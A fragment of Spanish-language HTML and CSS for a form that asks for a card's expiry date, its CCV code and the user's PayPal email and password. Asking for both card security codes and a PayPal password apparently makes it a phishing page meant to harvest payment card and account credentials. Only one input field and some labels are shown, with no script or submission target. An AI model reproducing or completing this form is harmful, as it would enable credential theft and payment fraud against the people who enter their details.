        input, select { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }

        <label>Fecha de Vencimiento (MM/AA):</label>

        <label>Código CCV:</label>
        <input type="text" name="card_ccv" placeholder="123" required>

        <label>Correo Electrónico (PayPal):</label>

        <label>Contraseña de PayPal:</label>
